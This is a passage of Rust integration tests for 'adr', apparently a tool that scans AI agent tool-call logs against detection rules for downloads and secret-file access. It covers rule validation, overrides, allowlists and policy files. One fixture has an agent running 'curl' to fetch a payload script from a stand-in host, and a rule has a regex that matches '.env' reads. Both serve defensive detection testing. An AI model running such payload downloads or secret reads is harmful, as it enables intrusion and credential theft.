    let defaults = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "validate"])
        .arg("--no-local-config")
        .output()
        .expect("run adr rules validate defaults");
    assert!(
        defaults.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&defaults.stderr)
    );
    let defaults_summary: Value = serde_json::from_slice(&defaults.stdout).expect("summary json");

    let additive = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "validate",
            "--no-local-config",
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
        ])
        .output()
        .expect("run adr rules validate");
    assert!(
        additive.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&additive.stderr)
    );
    let additive_summary: Value = serde_json::from_slice(&additive.stdout).expect("summary json");

    let custom_only = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "validate",
            "--no-local-config",
            "--no-default-rules",
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
        ])
        .output()
        .expect("run adr rules validate custom only");
    assert!(
        custom_only.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&custom_only.stderr)
    );
    let custom_only_summary: Value =
        serde_json::from_slice(&custom_only.stdout).expect("summary json");
    assert_eq!(custom_only_summary["rule_count"], 1);
    assert_eq!(
        additive_summary["rule_count"].as_u64(),
        defaults_summary["rule_count"]
            .as_u64()
            .map(|count| count + 1)
    );
}

#[test]
fn rules_validate_discovers_local_rules_d_and_can_disable_local_config() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let rules_dir = config_root.join("rules.d");
    fs::create_dir_all(&rules_dir).expect("rules dir");
    fs::write(
        rules_dir.join("custom-agent-behavior.yml"),
        include_str!("../../tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml"),
    )
    .expect("write local rule");

    let defaults = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "validate", "--no-local-config"])
        .output()
        .expect("run adr rules validate defaults");
    assert!(
        defaults.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&defaults.stderr)
    );
    let defaults_summary: Value = serde_json::from_slice(&defaults.stdout).expect("summary json");

    let discovered = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run adr rules validate with local config");
    assert!(
        discovered.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&discovered.stderr)
    );
    let discovered_summary: Value =
        serde_json::from_slice(&discovered.stdout).expect("summary json");
    assert_eq!(
        discovered_summary["rule_count"].as_u64(),
        defaults_summary["rule_count"]
            .as_u64()
            .map(|count| count + 1)
    );

    let ignored = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "validate", "--config-dir"])
        .arg(&config_root)
        .args(["--no-local-config"])
        .output()
        .expect("run adr rules validate with local config disabled");
    assert!(
        ignored.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&ignored.stderr)
    );
    let ignored_summary: Value = serde_json::from_slice(&ignored.stdout).expect("summary json");
    assert_eq!(
        ignored_summary["rule_count"],
        defaults_summary["rule_count"]
    );
}

#[test]
fn rules_validate_reports_ordered_pack_winner_and_replacements() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    fs::create_dir_all(config_root.join("organization-rules.d")).expect("organization rules dir");
    fs::write(
        config_root.join("organization-rules.d/org.yaml"),
        custom_rule_yaml("replacement.target", "organization"),
    )
    .expect("write organization rule");
    fs::create_dir_all(config_root.join("rules.d")).expect("deployment rules dir");
    fs::write(
        config_root.join("rules.d/deployment.yaml"),
        custom_rule_yaml("replacement.target", "deployment"),
    )
    .expect("write deployment rule");
    fs::create_dir_all(config_root.join("ui-rules.d")).expect("local rules dir");
    fs::write(
        config_root.join("ui-rules.d/local.yaml"),
        custom_rule_yaml("replacement.target", "local"),
    )
    .expect("write local rule");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "validate", "--no-default-rules", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run ordered pack validation");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("validation json");
    let provenance = summary["provenance"]
        .as_array()
        .expect("provenance array")
        .iter()
        .find(|entry| entry["id"] == "replacement.target")
        .expect("replacement provenance");
    assert!(provenance["winner"].as_str().unwrap().contains("local-ui:"));
    assert_eq!(provenance["replaced_sources"].as_array().unwrap().len(), 2);
}

#[test]
fn rules_list_reports_pack_winner_and_replaced_sources() {
    let pack_root = Path::new("tests/fixtures/rule_packs/ordered");
    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "list", "--verbose", "--config-dir"])
        .arg(pack_root)
        .output()
        .expect("run fixture pack list");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let line = stdout
        .lines()
        .find(|line| line.starts_with("secret.env.read\t"))
        .expect("listed replaced bundled rule");
    let columns: Vec<_> = line.split('\t').collect();
    assert_eq!(columns.len(), 7, "unexpected verbose rule-list row: {line}");
    assert!(
        columns[5].contains("deployment:"),
        "missing winner source: {line}"
    );
    assert!(
        columns[6].contains("builtin:telltale.default"),
        "missing replaced source: {line}"
    );
}

#[test]
fn rules_validate_rejects_equal_tier_duplicates_across_config_roots() {
    let temp = tempdir().expect("tempdir");
    let first_root = temp.path().join("first");
    let second_root = temp.path().join("second");
    for (root, name) in [(&first_root, "first.yaml"), (&second_root, "second.yaml")] {
        let path = root.join("organization-rules.d").join(name);
        fs::create_dir_all(path.parent().expect("organization rules dir"))
            .expect("organization rules dir");
        fs::write(&path, custom_rule_yaml("same.id", "same")).expect("duplicate rule");
    }

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "validate", "--no-default-rules", "--config-dir"])
        .arg(&first_root)
        .args(["--config-dir"])
        .arg(&second_root)
        .output()
        .expect("run duplicate validation");
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("duplicate rule id: same.id"));
    assert!(stderr.contains("first.yaml"));
    assert!(stderr.contains("second.yaml"));
}

#[test]
fn rules_validate_discovers_local_overrides_and_can_disable_local_config() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let state_path = temp.path().join("scan-state.json");
    let override_path = config_root.join("overrides.d/disable-download.yaml");
    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
    fs::write(
        &override_path,
        r#"version: 1
description: Local override test.
overrides:
  - rule_id: network.download
    enabled: false
    reason: Too noisy for this workstation.
"#,
    )
    .expect("write override");

    let defaults = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "validate", "--no-local-config"])
        .output()
        .expect("run adr rules validate defaults");
    assert!(
        defaults.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&defaults.stderr)
    );
    let defaults_summary: Value = serde_json::from_slice(&defaults.stdout).expect("summary json");
    let default_rule_count = defaults_summary["rule_count"]
        .as_u64()
        .expect("default rule count");

    let discovered = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run adr rules validate with override");
    assert!(
        discovered.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&discovered.stderr)
    );
    let discovered_summary: Value =
        serde_json::from_slice(&discovered.stdout).expect("summary json");
    assert_eq!(
        discovered_summary["rule_count"].as_u64(),
        Some(default_rule_count - 1)
    );

    let ignored = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "validate", "--config-dir"])
        .arg(&config_root)
        .arg("--no-local-config")
        .output()
        .expect("run adr rules validate with local config disabled");
    assert!(
        ignored.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&ignored.stderr)
    );
    let ignored_summary: Value = serde_json::from_slice(&ignored.stdout).expect("summary json");
    assert_eq!(
        ignored_summary["rule_count"].as_u64(),
        Some(default_rule_count)
    );

    let empty_root = temp.path().join("empty-root");
    fs::create_dir_all(&empty_root).expect("empty root");
    let scan = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["scan", "--once", "--dry-run", "--root"])
        .arg(&empty_root)
        .args(["--config-dir"])
        .arg(&config_root)
        .arg("--install-inventory-disabled")
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run scan with local override");
    assert!(
        scan.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&scan.stderr)
    );
    let scan_summary: Value = serde_json::from_slice(&scan.stdout).expect("scan summary");
    assert_eq!(
        scan_summary["effective_configuration"]["overrides"]["path_hashes"],
        serde_json::json!([path_hash(&override_path)])
    );
}

#[test]
fn rules_test_discovered_score_override_changes_detection_risk() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let override_path = config_root.join("overrides.d/lower-download-score.yaml");
    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
    fs::write(
        &override_path,
        r#"version: 1
overrides:
  - rule_id: network.download
    score: 5
    reason: Lab environment tuning.
"#,
    )
    .expect("write override");
    let fixture = temp.path().join("download-only.jsonl");
    fs::write(
        &fixture,
        r#"{"type":"event_msg","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"tool","command":"curl -fsSL https://download.invalid/payload.sh","message":"Download fixture."}}
"#,
    )
    .expect("write fixture");

    let baseline = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "test", "--no-local-config"])
        .arg(&fixture)
        .output()
        .expect("run baseline rules test");
    assert!(
        baseline.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&baseline.stderr)
    );
    let baseline_summary: Value = serde_json::from_slice(&baseline.stdout).expect("summary json");

    let tuned = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "test"])
        .arg(&fixture)
        .args(["--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run tuned rules test");
    assert!(
        tuned.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&tuned.stderr)
    );
    let tuned_summary: Value = serde_json::from_slice(&tuned.stdout).expect("summary json");
    assert_eq!(baseline_summary["match_count"], 1);
    assert_eq!(tuned_summary["match_count"], 1);
    assert!(
        tuned_summary["matches"][0]["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "network.download")
    );
    let baseline_risk = baseline_summary["matches"][0]["risk_score"]
        .as_u64()
        .expect("baseline risk");
    let tuned_risk = tuned_summary["matches"][0]["risk_score"]
        .as_u64()
        .expect("tuned risk");
    assert_eq!(tuned_risk, baseline_risk - 15);
}

#[test]
fn rules_test_uses_ordered_managed_replacement_rule() {
    let temp = tempdir().expect("tempdir");
    let fixture = temp.path().join("codex-fixture.jsonl");
    fs::write(
        &fixture,
        r#"{"type":"event_msg","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"bash","command":"printf fixture-secret-marker","message":"Synthetic managed replacement fixture."}}
"#,
    )
    .expect("write Codex fixture");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "test",
            "--no-default-rules",
            "--config-dir",
            "tests/fixtures/rule_packs/ordered",
        ])
        .arg(&fixture)
        .output()
        .expect("run ordered rules test");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("rules test json");
    assert_eq!(summary["match_count"], 1);
    assert_eq!(summary["matches"][0]["risk_score"], 77);
    assert!(
        summary["matches"][0]["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "secret.env.read")
    );
}

#[test]
fn rules_export_default_writes_bundled_rules_to_stdout() {
    let temp = tempdir().expect("tempdir");
    let exported_path = temp.path().join("exported-default-rules.yaml");

    let export = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "export-default"])
        .output()
        .expect("run adr rules export-default");
    assert!(
        export.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&export.stderr)
    );
    let exported_yaml = String::from_utf8(export.stdout).expect("exported yaml utf8");
    assert!(exported_yaml.contains("version:"));
    assert!(exported_yaml.contains("secret.env.read"));
    fs::write(&exported_path, exported_yaml).expect("write exported yaml");

    let validate = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "rules",
            "validate",
            "--no-default-rules",
            "--no-local-config",
            "--rules",
        ])
        .arg(&exported_path)
        .output()
        .expect("validate exported default rules");
    assert!(
        validate.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&validate.stderr)
    );
    let summary: Value = serde_json::from_slice(&validate.stdout).expect("summary json");
    assert!(summary["rule_count"].as_u64().expect("rule count") > 0);
}

#[test]
fn rules_export_default_writes_file_and_requires_force_to_overwrite() {
    let temp = tempdir().expect("tempdir");
    let output_path = temp.path().join("default-rules.yaml");

    let first_export = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "export-default", "--output"])
        .arg(&output_path)
        .output()
        .expect("run adr rules export-default --output");
    assert!(
        first_export.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&first_export.stderr)
    );
    let first_contents = fs::read_to_string(&output_path).expect("exported default rules");
    assert!(first_contents.contains("network.download"));

    let overwrite_without_force = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "export-default", "--output"])
        .arg(&output_path)
        .output()
        .expect("run adr rules export-default overwrite");
    assert!(!overwrite_without_force.status.success());
    let stderr = String::from_utf8_lossy(&overwrite_without_force.stderr);
    assert!(stderr.contains("already exists"));
    assert!(stderr.contains("--force"));

    fs::write(&output_path, "placeholder\n").expect("replace output with placeholder");
    let overwrite_with_force = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["rules", "export-default", "--output"])
        .arg(&output_path)
        .arg("--force")
        .output()
        .expect("run adr rules export-default --force");
    assert!(
        overwrite_with_force.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&overwrite_with_force.stderr)
    );
    let forced_contents = fs::read_to_string(&output_path).expect("forced exported default rules");
    assert_eq!(forced_contents, first_contents);
}

#[test]
fn config_validate_default_rules_without_local_config() {
    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--no-local-config"])
        .output()
        .expect("run adr config validate");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["status"], "ok");
    assert!(summary["rule_count"].as_u64().expect("rule count") > 0);
    assert_eq!(summary["default_rules"], true);
    assert_eq!(summary["local_config"]["enabled"], false);
    assert_eq!(
        summary["local_config"]["explicit_config_dirs"],
        Value::Array(vec![])
    );
    assert_eq!(summary["local_config"]["discovered_rule_count"], 0);
    assert_eq!(
        summary["outputs"]["delivery"]["posture"],
        "durable_first_write"
    );
    assert_eq!(summary["outputs"]["delivery"]["source"], "legacy_default");
    assert_eq!(summary["outputs"]["delivery"]["enabled_sink_count"], 1);
}

#[test]
fn config_validate_custom_only_rules_succeeds_with_one_rule() {
    let temp = tempdir().expect("tempdir");
    let rule_path = temp.path().join("custom-only.yaml");
    fs::write(
        &rule_path,
        custom_rule_yaml("custom.config_validate.only", "custom-only"),
    )
    .expect("write custom rule");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args([
            "config",
            "validate",
            "--no-default-rules",
            "--no-local-config",
            "--rules",
        ])
        .arg(&rule_path)
        .output()
        .expect("run adr config validate");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["status"], "ok");
    assert_eq!(summary["default_rules"], false);
    assert_eq!(summary["rule_count"], 1);
    assert_eq!(summary["rules"]["explicit_count"], 1);
    assert_eq!(
        summary["rules"]["paths"],
        Value::Array(vec![Value::String(rule_path.display().to_string())])
    );
}

#[test]
fn config_validate_repeated_rules_are_additive_and_reported() {
    let temp = tempdir().expect("tempdir");
    let first_rule = temp.path().join("first.yaml");
    let second_rule = temp.path().join("second.yaml");
    fs::write(
        &first_rule,
        custom_rule_yaml("custom.config_validate.first", "custom-first"),
    )
    .expect("write first custom rule");
    fs::write(
        &second_rule,
        custom_rule_yaml("custom.config_validate.second", "custom-second"),
    )
    .expect("write second custom rule");

    let defaults = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--no-local-config"])
        .output()
        .expect("run adr config validate defaults");
    assert!(
        defaults.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&defaults.stderr)
    );
    let defaults_summary: Value = serde_json::from_slice(&defaults.stdout).expect("summary json");
    let default_rule_count = defaults_summary["rule_count"]
        .as_u64()
        .expect("default rule count");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--no-local-config", "--rules"])
        .arg(&first_rule)
        .args(["--rules"])
        .arg(&second_rule)
        .output()
        .expect("run adr config validate with repeated rules");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["rule_count"].as_u64(), Some(default_rule_count + 2));
    assert_eq!(summary["rules"]["explicit_count"], 2);
    let paths = summary["rules"]["paths"].as_array().expect("rule paths");
    assert!(paths.contains(&Value::String(first_rule.display().to_string())));
    assert!(paths.contains(&Value::String(second_rule.display().to_string())));
}

#[test]
fn config_validate_discovers_local_rules_d_additively() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let rules_dir = config_root.join("rules.d");
    fs::create_dir_all(&rules_dir).expect("rules dir");
    fs::write(
        rules_dir.join("custom-agent-behavior.yml"),
        include_str!("../../tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml"),
    )
    .expect("write local rule");

    let defaults = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--no-local-config"])
        .output()
        .expect("run adr config validate defaults");
    assert!(
        defaults.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&defaults.stderr)
    );
    let defaults_summary: Value = serde_json::from_slice(&defaults.stdout).expect("summary json");

    let discovered = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run adr config validate with local config");
    assert!(
        discovered.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&discovered.stderr)
    );
    let discovered_summary: Value =
        serde_json::from_slice(&discovered.stdout).expect("summary json");
    assert_eq!(
        discovered_summary["rule_count"].as_u64(),
        defaults_summary["rule_count"]
            .as_u64()
            .map(|count| count + 1)
    );
    assert_eq!(
        discovered_summary["local_config"]["discovered_rule_count"],
        1
    );
    assert_eq!(discovered_summary["rules"]["discovered_count"], 1);
}

#[test]
fn config_validate_reports_discovered_override_paths() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let override_path = config_root
        .join("overrides.d")
        .join("lower-secret-score.yml");
    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
    fs::write(
        &override_path,
        r#"version: 1
description: Local config validate override test.
overrides:
  - rule_id: secret.env.read
    score: 20
    reason: Lab environment tuning.
"#,
    )
    .expect("write override");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run adr config validate");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["status"], "ok");
    assert_eq!(summary["local_config"]["discovered_override_count"], 1);
    assert_eq!(summary["overrides"]["discovered_count"], 1);
    assert_eq!(
        summary["overrides"]["paths"],
        Value::Array(vec![Value::String(override_path.display().to_string())])
    );
}

#[test]
fn config_validate_rejects_invalid_local_overrides() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let override_path = config_root.join("overrides.d/invalid.yaml");
    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");

    fs::write(
        &override_path,
        r#"version: 1
overrides:
  - rule_id: missing.rule
    enabled: false
    reason: Unknown rule should fail.
"#,
    )
    .expect("write unknown override");
    let unknown = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run adr config validate");
    assert!(
        !unknown.status.success(),
        "unknown rule override should fail"
    );
    let stderr = String::from_utf8_lossy(&unknown.stderr);
    assert!(stderr.contains("unknown rule_id 'missing.rule'"));

    fs::write(
        &override_path,
        r#"version: 1
overrides:
  - rule_id: network.download
    enabled: false
    reason: "   "
"#,
    )
    .expect("write empty reason override");
    let empty_reason = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run adr config validate");
    assert!(
        !empty_reason.status.success(),
        "empty reason override should fail"
    );
    let stderr = String::from_utf8_lossy(&empty_reason.stderr);
    assert!(stderr.contains("requires a non-empty reason"));

    fs::write(
        &override_path,
        r#"version: 1
overrides:
  - rule_id: network.download
    reason: Missing effect should fail.
"#,
    )
    .expect("write no effect override");
    let no_effect = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run adr config validate");
    assert!(
        !no_effect.status.success(),
        "no effect override should fail"
    );
    let stderr = String::from_utf8_lossy(&no_effect.stderr);
    assert!(stderr.contains("must set enabled or score"));
}

#[test]
fn config_validate_reports_managed_rule_replacement() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let rule_path = config_root.join("rules.d/duplicate-bundled.yaml");
    fs::create_dir_all(rule_path.parent().expect("rules dir")).expect("rules dir");
    fs::write(
        &rule_path,
        r#"version: 1
description: Duplicate bundled id for local config validation.
defaults:
  case_insensitive: true
  enabled: true
rules:
  - id: secret.env.read
    category: secret_access
    severity: medium
    score: 35
    targets: [command]
    regex: '\.env'
    tags: [test]
    explanation: Duplicate bundled rule id.
modifiers: []
"#,
    )
    .expect("write duplicate rule");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run adr config validate");

    assert!(
        output.status.success(),
        "config validate should accept managed replacement: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("config validation json");
    let replacement = summary["rules"]["provenance"]
        .as_array()
        .expect("rule provenance")
        .iter()
        .find(|entry| entry["id"] == "secret.env.read")
        .expect("replaced bundled rule provenance");
    assert!(
        replacement["winner"]
            .as_str()
            .unwrap()
            .contains("deployment:")
    );
    assert_eq!(
        replacement["replaced_sources"],
        serde_json::json!(["builtin:telltale.default"])
    );
}

#[test]
fn config_validate_reports_ambiguous_policy_unless_explicit_policy_is_supplied() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    fs::create_dir_all(config_root.join("policies.d")).expect("policies dir");
    fs::write(
        config_root.join("policies.d/one.yaml"),
        "name: local-one\ndisabled_categories: [network]\n",
    )
    .expect("write first local policy");
    fs::write(
        config_root.join("policies.d/two.yml"),
        "name: local-two\ndisabled_categories: [secret_access]\n",
    )
    .expect("write second local policy");
    let explicit_policy = temp.path().join("explicit-policy.yaml");
    fs::write(
        &explicit_policy,
        "name: explicit-policy\ndisabled_categories: [network]\n",
    )
    .expect("write explicit policy");

    let ambiguous = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run adr config validate");
    assert!(!ambiguous.status.success(), "policy ambiguity should fail");
    let stderr = String::from_utf8_lossy(&ambiguous.stderr);
    assert!(
        stderr.contains("multiple local policy files discovered"),
        "unexpected stderr: {stderr}"
    );

    let explicit = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .args(["--policy"])
        .arg(&explicit_policy)
        .output()
        .expect("run adr config validate with explicit policy");
    assert!(
        explicit.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&explicit.stderr)
    );
    let summary: Value = serde_json::from_slice(&explicit.stdout).expect("summary json");
    assert_eq!(summary["policy_name"], "explicit-policy");
    assert_eq!(summary["local_config"]["discovered_policy_count"], 2);
}

#[test]
fn config_validate_reports_ambiguous_allowlist_unless_explicit_allowlist_is_supplied() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    fs::create_dir_all(config_root.join("allowlists.d")).expect("allowlists dir");
    fs::write(
        config_root.join("allowlists.d/one.yaml"),
        "suppressions: []\n",
    )
    .expect("write first local allowlist");
    fs::write(
        config_root.join("allowlists.d/two.yml"),
        "suppressions: []\n",
    )
    .expect("write second local allowlist");
    let explicit_allowlist = temp.path().join("explicit-allowlist.yaml");
    fs::write(&explicit_allowlist, "suppressions: []\n").expect("write explicit allowlist");

    let ambiguous = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run adr config validate");
    assert!(
        !ambiguous.status.success(),
        "allowlist ambiguity should fail"
    );
    let stderr = String::from_utf8_lossy(&ambiguous.stderr);
    assert!(
        stderr.contains("multiple local allowlist files discovered"),
        "unexpected stderr: {stderr}"
    );

    let explicit = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .args(["--allowlist"])
        .arg(&explicit_allowlist)
        .output()
        .expect("run adr config validate with explicit allowlist");
    assert!(
        explicit.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&explicit.stderr)
    );
    let summary: Value = serde_json::from_slice(&explicit.stdout).expect("summary json");
    assert_eq!(summary["local_config"]["discovered_allowlist_count"], 2);
    assert_eq!(
        summary["allowlist_path"],
        explicit_allowlist.display().to_string()
    );
}

#[test]
fn config_validate_reports_single_discovered_allowlist_path() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let allowlist_path = config_root.join("allowlists.d").join("known-benign.yaml");
    fs::create_dir_all(allowlist_path.parent().expect("allowlists dir")).expect("allowlists dir");
    fs::write(
        &allowlist_path,
        "version: 1\ndescription: Test allowlist.\nsuppressions: []\n",
    )
    .expect("write allowlist");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run adr config validate");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["local_config"]["discovered_allowlist_count"], 1);
    assert_eq!(
        summary["allowlist_path"],
        allowlist_path.display().to_string()
    );
}

#[test]
fn config_validate_rejects_unknown_allowlist_suppression_key() {
    let temp = tempdir().expect("tempdir");
    let allowlist_path = temp.path().join("allowlist.yaml");
    fs::write(
        &allowlist_path,
        r#"suppressions:
  - name: misspelled-rule-id
    rule_id: [secret.env.read]
"#,
    )
    .expect("write invalid allowlist");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--no-local-config", "--allowlist"])
        .arg(&allowlist_path)
        .output()
        .expect("run adr config validate");

    assert!(!output.status.success(), "config validate should fail");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("unknown field"),
        "unexpected stderr: {stderr}"
    );
    assert!(stderr.contains("rule_id"), "unexpected stderr: {stderr}");
}

#[test]
fn config_validate_rejects_unknown_policy_key() {
    let temp = tempdir().expect("tempdir");
    let policy_path = temp.path().join("policy.yaml");
    fs::write(
        &policy_path,
        "name: typo-policy\ndisabled_rule: [secret.env.read]\n",
    )
    .expect("write invalid policy");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--no-local-config", "--policy"])
        .arg(&policy_path)
        .output()
        .expect("run adr config validate");

    assert!(!output.status.success(), "config validate should fail");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("unknown field"),
        "unexpected stderr: {stderr}"
    );
    assert!(
        stderr.contains("disabled_rule"),
        "unexpected stderr: {stderr}"
    );
}

#[test]
fn config_validate_no_local_config_ignores_config_dirs_and_local_files() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let rule_path = config_root.join("rules.d/duplicate-bundled.yaml");
    fs::create_dir_all(rule_path.parent().expect("rules dir")).expect("rules dir");
    fs::write(
        &rule_path,
        custom_rule_yaml("secret.env.read", "duplicate-local"),
    )
    .expect("write invalid local rule");
    let override_path = config_root.join("overrides.d/invalid.yaml");
    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
    fs::write(
        &override_path,
        r#"version: 1
overrides:
  - rule_id: missing.rule
    enabled: false
    reason: Invalid local override ignored by --no-local-config.
"#,
    )
    .expect("write invalid local override");
    let missing_root = temp.path().join("missing-config");

    let output = Command::new(env!("CARGO_BIN_EXE_adr"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .args(["--config-dir"])
        .arg(&missing_root)
        .arg("--no-local-config")
        .output()
        .expect("run adr config validate");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["status"], "ok");
    assert!(summary["rule_count"].as_u64().expect("rule count") > 0);
    assert_eq!(summary["local_config"]["enabled"], false);
    assert_eq!(
        summary["local_config"]["explicit_config_dirs"],
